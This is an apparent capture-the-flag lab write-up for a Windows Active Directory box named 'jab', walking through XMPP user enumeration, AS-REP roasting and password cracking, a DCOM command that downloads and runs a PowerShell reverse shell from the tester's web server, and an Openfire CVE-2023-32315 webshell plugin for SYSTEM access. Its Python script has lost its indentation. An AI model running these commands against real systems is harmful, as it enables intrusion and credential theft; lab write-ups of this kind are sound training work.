

## Lab Details
- Difficulty: Medium
- OS: Windows

## Summary
- Initial access: XMPP Enumeration, AD Misconfiguration 
- Privilege escalation: Outdated App Version

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.230.215 -Pn -sT -p 88,135,389,593,636,3268,3269,47001,5222,5223,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9389,49664,49665,49666,49667,49675,49692,49693,49694,49766,49786 -sC -sV -A
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-12 02:27 EDT
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 54.84% done; ETC: 02:28 (0:00:30 remaining)
Nmap scan report for 10.129.230.215
Host is up (0.0033s latency).

PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-12 06:27:24Z)
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-07-12T06:30:15+00:00; -10s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-07-12T06:30:16+00:00; -9s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
5222/tcp  open  jabber       Ignite Realtime Openfire Jabber server 3.10.0 or later
|_xmpp-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
5223/tcp  open  ssl/jabber
|_xmpp-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5262/tcp  open  jabber       Ignite Realtime Openfire Jabber server 3.10.0 or later
|_xmpp-info: ERROR: Script execution failed (use -d to debug)
5263/tcp  open  ssl/jabber   Ignite Realtime Openfire Jabber server 3.10.0 or later
|_xmpp-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
5269/tcp  open  xmpp         Wildfire XMPP Client
|_xmpp-info: ERROR: Script execution failed (use -d to debug)
5270/tcp  open  xmp?
5275/tcp  open  jabber       Ignite Realtime Openfire Jabber server 3.10.0 or later
|_xmpp-info: ERROR: Script execution failed (use -d to debug)
5276/tcp  open  ssl/jabber   Ignite Realtime Openfire Jabber server 3.10.0 or later
|_xmpp-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7070/tcp  open  http         Jetty
7443/tcp  open  ssl/http     Jetty
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
7777/tcp  open  socks5       (No authentication; connection failed)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49675/tcp open  unknown
49692/tcp open  unknown
49693/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49694/tcp open  unknown
49766/tcp open  unknown
49786/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5223-TCP:V=7.95%T=SSL%I=7%D=7/12%Time=6A5333F5%P=x86_64-pc-linux-gn
SF:u%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\
SF:.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-
SF:streams\"/></stream:error></stream:stream>");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -9s, deviation: 0s, median: -10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.73 seconds
```
## Foothold

#### Steps
- Targe seems to host an XMPP server, since port 5222 is hosting an Openfire server 
##### Add server info - pidgin
- In basic tab select the protocol to be `xmpp`
![[Pasted image 20260712151110.png]]
- Add the server specifications in the Advanced tab
![[Pasted image 20260712151059.png]]
- **NOTE**: Remember to add the domain name to `/etc/hosts`
- Accept the certificate 
![[Pasted image 20260712151412.png]]
- Create a new user 
![[Pasted image 20260712152234.png]]
- Ticket the enabled box to connect to the domain 
![[Pasted image 20260712152252.png]]
##### Enumerate Rooms
- To go tools -> Room list -> Get list
![[Pasted image 20260712152405.png]]
- Click on find rooms
![[Pasted image 20260712152500.png]]
- In test2 we find user `bdavis` sent an image in the chat
![[Pasted image 20260712152527.png]]

##### Enumerate Users
- Accounts -> current user -> Search for users 
![[Pasted image 20260712154803.png]]
- Enter the target domain
![[Pasted image 20260712154857.png]]
- Input `*` to filter for all users
![[Pasted image 20260712154909.png]]
- Display all users in the domain
![[Pasted image 20260712154929.png]]

##### Enumerate Plugins
- Tools -> Plugins
![[Pasted image 20260712155011.png]]

##### Interact with Console Plugin
- Tools -> plugins -> ticket the enabled for xmpp console
- Go back to tools -> XMPP console -> console
![[Pasted image 20260712155148.png]]
- XMPP Query Doc: https://xmpp.org/extensions/xep-0055.html
- We can attempt to search for all users using the console plugin with below query
```
<iq type='set' 
    from='0xdf@jab.htb'
    to='search.jab.htb'
    id='search4users'
    xml:lang='en'>
    <query xmlns='jabber:iq:search'>
        <last>*</last>
    </query>
</iq>
```

![[Pasted image 20260712155258.png]]
- We get a response back
![[Pasted image 20260712155413.png]]
- Python script version
```
import socket
import re
def recv_all(sock):
buffer = []
while True:
part = sock.recv(4096)
if "/iq".encode('utf-8') in part:
buffer.append(part)
break
buffer.append(part)
return b''.join(buffer)
def extract_usernames(finalresp):
pattern = re.compile(r'<field var="Username"><value>(.*?)</value></field>')
return pattern.findall(finalresp)
def write_usernames_to_file(usernames, filename):
with open(filename, 'w') as file:
for username in usernames:
file.write(username + '\n')
sock = socket.create_connection(('jab.htb', 5222))
sock.sendall("<stream:stream to='jab.htb' xmlns='jabber:client' ".encode('utf-8')
+
"xmlns:stream='http://etherx.jabber.org/streams'
version='1.0'>".encode('utf-8'))
resp = sock.recv(4096)
resp = resp + sock.recv(4096)
print(resp.decode('utf-8') + "\n")
sock.sendall("<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl'
mechanism='PLAIN'>AHJvZ3VlAHJvZ3Vl</auth>".encode('utf-8'))
resp = sock.recv(4096)
print(resp.decode('utf-8') + "\n")
sock.sendall("<stream:stream from='rogue@jab.htb' to='search.jab.htb'
".encode('utf-8') +
"version='1.0' xml:lang='en' xmlns='jabber:client'".encode('utf-8')
+
" xmlns:stream='http://etherx.jabber.org/streams'>".encode('utf-8'))
resp = sock.recv(4096)
print(resp.decode('utf-8') + "\n")
sock.sendall("<iq id='wy2xa82b4' type='set'> <bind
xmlns='urn:ietf:params:xml:ns:xmpp-bind'>".encode('utf-8') +
" <resource>search</resource> </bind> </iq>".encode('utf-8'))
resp = sock.recv(4096)
print(resp.decode('utf-8') + "\n")
sock.sendall("<iq type='set' to='search.jab.htb' xmlns='jabber:client'> <query
xmlns='jabber:iq:search'>".encode('utf-8') +
" <x xmlns='jabber:x:data' type='submit'> <field var='search'>
<value>*</value> </field>".encode('utf-8') +
"<field var='Username'><value>1</value></field></x></query>
</iq>".encode('utf-8'))
finalresp = recv_all(sock)
finalresp = finalresp.decode('utf-8')
usernames = extract_usernames(finalresp)
with open('usernames.txt', 'w') as file:
for username in usernames:
file.write(username + '\n')
```

- Save the response to a file and extract users
```
grep -oP "jid='\K[^@']+" users.xml > usernames.txt
```

- Perform AS-REP Roasting with the usernames obtain from pidgin
```
$GetNPUsers.py -usersfile usernames.txt -request -format hashcat -outputfile asrep.txt 'jab.htb/'
```
- Crack the hash using hashcat we get plaintext password
```
$hashcat asrep.txt /usr/share/wordlists/rockyou.txt
<SNIP>
$krb5asrep$23$jmontgomery@JAB.HTB:46988eb773edd0c3e10f5262a0f98afe$a118a123b2c0c8c9dc019ff987343a42948bbaf511e20ee8babe57072f80f9332ade2f53f29c2adb48e08b487ca2517cad4343a146315e5076669ff70eb4741144af191f54dba88997e8321fc85e43c42bf77d465b987add8a11cc13bbcd7b72be6add893c9b0b0781c032f75ce47ef26c787a4ea09dfd85beb26b22d22aff51a95a293ed5653c7436b55470dead7621e197f98090e6943c2344c457fd789e04a21fbc60c215d0552f8648d5bca9ea627ab3cd6ad8f2df47aee09fa1150ece3edf0aadd83d5d6513b2bcfc9fcca6ede1036f016eee047c563d00311d09d8702b49b7:Midnight_121
<SNIP>
```
- Attempt to authenticate and user is valid 
```
$nxc smb 10.129.230.215 -u jmontgomery -p Midnight_121
SMB         10.129.230.215  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.215  445    DC01             [+] jab.htb\jmontgomery:Midnight_121
```
- Login to pidgin as user `jmontgomery`
- Enumerate the rooms again and we found two rooms, one is named pentest2003
![[Pasted image 20260712170646.png]]
- We find a password cracked for user `svc_openfire`
![[Pasted image 20260712170707.png]]

```
 svc_openfire$ : !@#$%^&*(1qazxsw
```
- Confirm the user credential is valid with `nxc`
```
$nxc smb 10.129.230.215 -u 'svc_openfire' -p '!@#$%^&*(1qazxsw'
SMB         10.129.230.215  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.215  445    DC01             [+] jab.htb\svc_openfire:!@#$%^&*(1qazxsw
```
- Run bloodhound-python as `svc_openfire` and  upload to bloodhound for analysis
```
bloodhound-python -d jab.htb -c all -u svc_openfire -p '!@#$%^&*(1qazxsw' -ns 10.10.11.4 --zip
```
- Identified user `svc_openfire` is part of the `DISTRIBUTED COM USERS` group
![[Pasted image 20260712171331.png]]

- DCOM, which stands for Distributed Component Object Model, is a Microsoft technology that allows software components to communicate directly over a network. 
- Essentially, it enables objects on one computer to interact with objects on another computer, similar to how they would interact if they were on the same machine. 
- DCOM extends the Component Object Model (COM) to support communication among objects on different computers in a network.
- There are two steps to perform the reverse shell execution, first fetch reverse shell payload from local to target using `dcomexec` (start a python web server)
```
impacket-dcomexec -object MMC20 -silentcommand -debug jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.129.230.215 'powershell.exe InvokeWebRequest -Uri http://10.10.16.54:8000/shell.ps1 -OutFile C:\Windows\TEMP\rev.ps1'
```
- Then execute the payload using `dcomexec`
```
impacket-dcomexec -object MMC20 -silentcommand -debug jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.129.230.215 'powershell.exe C:\Windows\TEMP\rev.ps1'
```
- `rev.ps1` can be obtained from https://revshells.com/, obtain a powershell payload and save it to a file locally
## Lateral Movement 

#### Steps


## Privilege Escalation

#### Steps
- Enumerate the internal ports running, discovered ports 9090 and 9091
```
PS C:\Users\svc_openfire\Desktop> netstat -ano | findstr "LISTENING"
<SNIP>
TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3272
TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3272
<SNIP>
```
- Download and run chisel to perform port forwarding
```
./chisel.exe client 10.10.16.54:8001 R:9090:127.0.0.1:9090
```
- View port 9090 locally we see it hosting the openfire web app
![[Pasted image 20260712173436.png]]
- Login with `svc_openfire`
![[Pasted image 20260712173537.png]]
- Search app version online and found exploit https://github.com/miko550/CVE-2023-32315
![[Pasted image 20260712174256.png]]
- Follow the instructions in `readme` to upload the malicious plugin
```
1. goto tab plugin > upload plugin `openfire-management-tool-plugin.jar`
2. goto tab server > server settings > Management tool
3. Access webshell with password "123"
```
- Inject a reverse shell payload in webshell
![[Pasted image 20260712174408.png]]
![[Pasted image 20260712174508.png]]
- We get a callback as `nt authority \ system`
```
$nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.129.230.215 62606

PS C:\Program Files\Openfire\bin> whoami
nt authority\system
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: